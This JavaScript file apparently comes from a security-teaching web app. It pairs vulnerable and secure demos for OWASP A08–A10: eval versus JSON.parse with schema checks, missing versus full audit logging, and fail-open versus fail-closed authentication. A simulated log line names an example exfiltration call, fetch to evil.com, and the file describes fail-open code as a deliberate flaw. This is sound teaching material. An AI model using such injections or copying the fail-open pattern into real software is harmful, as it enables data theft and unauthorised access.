// ─── A08: Integrity / Deserialization ────────────────────────────────
function sandboxA08(vulnEl, secureEl) {
  vulnEl.innerHTML = `
    <p class="sandbox-desc">
      App uses <code>eval()</code> to parse profile data.</p>
    <textarea class="sandbox-input" id="a08-vuln-input" rows="2"
      style="margin-bottom:0.4rem; font-size:0.88rem;">{name:"Alice", role:"admin"}</textarea>
    <button class="sandbox-btn sandbox-btn--vulnerable" id="a08-vuln-btn">$ eval(input)</button>
    <div class="sandbox-output sandbox-output--vulnerable" id="a08-vuln-output" style="margin-top:0.4rem;"></div>`;

  document.getElementById("a08-vuln-btn").addEventListener("click", () => {
    const input = document.getElementById("a08-vuln-input").value;
    const output = document.getElementById("a08-vuln-output");
    output.innerHTML = "";
    logLine(output, "log-warn", "[!!] eval('(' + input + ')')");
    logLine(output, "log-error", "[XX] eval() executes ANY JavaScript in the input!");
    logLine(output, "log-error", "[XX] Attacker can inject: fetch('https://evil.com/...')");
    try {
      const safe = JSON.parse(input.replace(/(\w+):/g, '"$1":').replace(/'/g, '"'));
      logLine(output, "log-info", "[>>] Parsed: " + JSON.stringify(safe));
    } catch {
      logLine(output, "log-warn", "[!!] Not valid JSON — eval() would still run JS expressions.");
    }
  });

  secureEl.innerHTML = `
    <p class="sandbox-desc">
      <code>JSON.parse()</code> + schema validation.</p>
    <textarea class="sandbox-input" id="a08-sec-input" rows="2"
      style="margin-bottom:0.4rem; font-size:0.88rem;">{"name":"Alice", "role":"admin"}</textarea>
    <button class="sandbox-btn sandbox-btn--secure" id="a08-sec-btn">$ json-parse --validate</button>
    <div class="sandbox-output sandbox-output--secure" id="a08-sec-output" style="margin-top:0.4rem;"></div>`;

  document.getElementById("a08-sec-btn").addEventListener("click", () => {
    const input = document.getElementById("a08-sec-input").value;
    const output = document.getElementById("a08-sec-output");
    output.innerHTML = "";
    logLine(output, "log-info", "[1] JSON.parse() — cannot execute code");
    let parsed;
    try { parsed = JSON.parse(input); }
    catch (e) {
      logLine(output, "log-error", "[!!] Rejected: " + e.message);
      logLine(output, "log-success", "[OK] Malformed input blocked.");
      return;
    }
    logLine(output, "log-info", "[2] Schema validation...");
    const schema = { name: "string", email: "string", role: ["user", "editor"] };
    const validated = {};
    for (const [key, value] of Object.entries(parsed)) {
      if (!(key in schema)) { logLine(output, "log-warn", '     Unknown "' + key + '" — stripped'); continue; }
      if (key === "role" && !schema.role.includes(value)) {
        logLine(output, "log-warn", '     Role "' + value + '" not in [user,editor] — rejected');
        continue;
      }
      if (typeof value !== "string") { logLine(output, "log-warn", "     " + key + " not a string — rejected"); continue; }
      validated[key] = value;
    }
    logLine(output, "log-success", "[OK] Output: " + JSON.stringify(validated));
  });
}

// ─── A09: Logging & Alerting ─────────────────────────────────────────
function sandboxA09(vulnEl, secureEl) {
  vulnEl.innerHTML = `
    <p class="sandbox-desc">
      Perform actions — nothing is logged.</p>
    <div class="flex gap-sm flex-wrap" style="margin-bottom:0.4rem;">
      <button class="sandbox-btn sandbox-btn--vulnerable a09-v" data-action="login-fail">Failed Login</button>
      <button class="sandbox-btn sandbox-btn--vulnerable a09-v" data-action="access">Access Data</button>
      <button class="sandbox-btn sandbox-btn--vulnerable a09-v" data-action="escalate">Escalate</button>
    </div>
    <div class="sandbox-output sandbox-output--vulnerable" id="a09-vuln-output"><span class="log-info">[Security Log: EMPTY]</span></div>`;

  vulnEl.querySelectorAll(".a09-v").forEach((btn) => {
    btn.addEventListener("click", () => {
      document.getElementById("a09-vuln-output").innerHTML =
        '<span class="log-error">[XX] Action: ' + btn.dataset.action + '</span>\n' +
        '<span class="log-error">[XX] No log entry. No alert. Invisible to SOC.</span>';
    });
  });

  let failCount = 0;
  secureEl.innerHTML = `
    <p class="sandbox-desc">
      Full audit trail + automated alerts.</p>
    <div class="flex gap-sm flex-wrap" style="margin-bottom:0.4rem;">
      <button class="sandbox-btn sandbox-btn--secure a09-s" data-action="login-fail" data-sev="WARN">Failed Login</button>
      <button class="sandbox-btn sandbox-btn--secure a09-s" data-action="access" data-sev="INFO">Access Data</button>
      <button class="sandbox-btn sandbox-btn--secure a09-s" data-action="escalate" data-sev="CRITICAL">Escalate</button>
    </div>
    <div class="sandbox-output sandbox-output--secure" id="a09-sec-output"><span class="log-info">[Audit Log: Ready]</span></div>`;

  secureEl.querySelectorAll(".a09-s").forEach((btn) => {
    btn.addEventListener("click", () => {
      const output = document.getElementById("a09-sec-output");
      const sev = btn.dataset.sev;
      const cls = sev === "CRITICAL" ? "log-error" : sev === "WARN" ? "log-warn" : "log-info";
      const time = new Date().toISOString().substring(11, 19);
      const ip = "192.168.1." + Math.floor(Math.random() * 255);
      logLine(output, cls, "[" + time + "] [" + sev + "] " + btn.dataset.action.toUpperCase() + " | IP:" + ip);
      if (btn.dataset.action === "login-fail") {
        failCount++;
        if (failCount >= 3)
          logLine(output, "log-error", "[ALERT] Brute force pattern — " + failCount + " failures. SOC notified.");
      }
      if (sev === "CRITICAL")
        logLine(output, "log-error", "[ALERT] Privilege escalation! Incident ticket created.");
    });
  });
}

// ─── A10: Exceptional Conditions ─────────────────────────────────────
function sandboxA10(vulnEl, secureEl) {
  vulnEl.innerHTML = `
    <p class="sandbox-desc">
      Auth service is down. Watch the error handling.</p>
    <button class="sandbox-btn sandbox-btn--vulnerable" id="a10-vuln-btn">$ check-auth --service-down</button>
    <div class="sandbox-output sandbox-output--vulnerable" id="a10-vuln-output" style="margin-top:0.4rem;"></div>`;

  document.getElementById("a10-vuln-btn").addEventListener("click", () => {
    const output = document.getElementById("a10-vuln-output");
    output.innerHTML = "";
    logLine(output, "log-info", "[>>] GET /api/auth?user=attacker&resource=admin");
    setTimeout(() => {
      logLine(output, "log-error", "[!!] NetworkError: auth service unreachable");
      logLine(output, "log-warn", '     catch: console.log("allowing access")');
      logLine(output, "log-warn", "     return true; // FAIL OPEN");
      setTimeout(() => {
        logLine(output, "log-error", "[XX] ACCESS GRANTED to attacker!");
        logLine(output, "log-error", "[XX] Stack trace in HTTP 500 response:");
        logLine(output, "log-error", "     at /app/src/auth.js:42:15");
        logLine(output, "log-error", "     at Router.handle (express/lib/router)");
        logLine(output, "log-error", "[XX] File paths + framework versions exposed!");
      }, 350);
    }, 500);
  });

  secureEl.innerHTML = `
    <p class="sandbox-desc">
      Same scenario — auth service is down. Fails closed.</p>
    <button class="sandbox-btn sandbox-btn--secure" id="a10-sec-btn">$ check-auth --service-down</button>
    <div class="sandbox-output sandbox-output--secure" id="a10-sec-output" style="margin-top:0.4rem;"></div>`;

  document.getElementById("a10-sec-btn").addEventListener("click", () => {
    const output = document.getElementById("a10-sec-output");
    output.innerHTML = "";
    logLine(output, "log-info", "[>>] GET /api/auth?user=attacker&resource=admin");
    setTimeout(() => {
      logLine(output, "log-warn", "[!!] NetworkError: auth service unreachable");
      logLine(output, "log-info", "     securityLogger.log({ severity: 'HIGH' })");
      logLine(output, "log-info", "     return false; // FAIL CLOSED");
      setTimeout(() => {
        const refId = "ERR-" + Math.random().toString(36).substring(2, 10).toUpperCase();
        logLine(output, "log-success", "[OK] ACCESS DENIED.");
        logLine(output, "log-success", "[OK] Logged internally. Ref: " + refId);
        logLine(output, "log-success", '[OK] User sees: "An error occurred. Ref: ' + refId + '"');
        logLine(output, "log-success", "[OK] No stack trace, no file paths exposed.");
      }, 350);
    }, 500);
  });
}

// ─── Logging utility ─────────────────────────────────────────────────
function logLine(container, className, text) {
  const line = document.createElement("div");
  line.className = "sandbox-log-entry " + className;
  line.innerHTML = text;
  container.appendChild(line);
  container.scrollTop = container.scrollHeight;
}

// ─── Init ────────────────────────────────────────────────────────────
renderSidebar();
handleHash();
